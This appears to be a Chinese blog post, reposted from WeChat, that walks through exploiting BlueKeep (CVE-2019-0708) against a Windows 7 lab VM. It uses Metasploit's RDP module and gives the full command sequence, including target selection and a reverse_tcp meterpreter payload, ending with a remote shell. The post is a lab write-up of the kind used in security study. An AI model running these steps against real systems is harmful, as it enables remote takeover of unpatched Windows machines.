# 针对Win7远程桌面的攻击实践（完美）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745327&idx=1&sn=98c53d20b5d384d42d245e5ab27bce1c&chksm=871488efb06301f98de5065ca1ab6b2b9ca0e7af66a224d5fa2d16347f79bfc4da476f6d7b72&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745327&idx=1&sn=98c53d20b5d384d42d245e5ab27bce1c&chksm=871488efb06301f98de5065ca1ab6b2b9ca0e7af66a224d5fa2d16347f79bfc4da476f6d7b72&scene=27#wechat_redirect)

  
CVE-2019-0708 (BlueKeep)刚出来的时候就写了针对Win7远程桌面的攻击实践，结尾的时候就猜测rapid7应该是已经掌握CVE-2019-0708 (BlueKeep)的exploit的，但是做为一个良心的安全公司，不能过早的把攻击能力放开，以免黑产的成本太低，虽说仅老版本的Windows受影响，但Win7的用户量着实还是有不少的，开个远程桌面也是家常便饭。

3个多月过去了，rapid7终于把exploit放了出来，

metasploit的exploit/windows目录下终于多了rdp协议，

本周赶紧安装metasploit的最新版本爽了一把，

靶机还是win7，这次是在esxi上装的一台虚拟机，

使用利用模块，  

use exploit/windows/rdp/cve\_2019\_0708\_bluekeep\_rce，

查看用法，

show options，

![](../Images/86619d9e76f921e21b4bf63b921258a6.png)

应该是只需设置靶机地址就可以了，  

set RHOSTS 172.22.14.1，

执行，

exploit，

![](../Images/b8ff3b68ac0f0a4f7d67f8abc05dada8.png)

说是要明确指定target，  

查看一下靶机类型，  

show targets，

![](../Images/0127c8bfe0fb6c62968a592ab5476618.png)

靶机环境是esxi上的，自然也就是vmware的，就从3开始试，  

![](../Images/4762eebe2749858eaee33f656b9a57f0.png)

一直都是这种情况，拿不到shell，

没办法，又从1开始试，结果target是2时成功了，

设置靶机类型是2，  

set target 2，

设置payload为反弹meterpreter shell，  

set payload windows/x64/meterpreter/reverse\_tcp，

执行，  

exploit，

![](../Images/ae3158128334fa09450897653e4f7e2c.png)

看一下系统信息，

![](../Images/3f6faaa35b44c2b93fcc5b0564b85112.png)

再开一下靶机地址和权限，

![](../Images/82b4eed3e7d84bb904ca89d0ab8b72dd.png)

这就完美了。
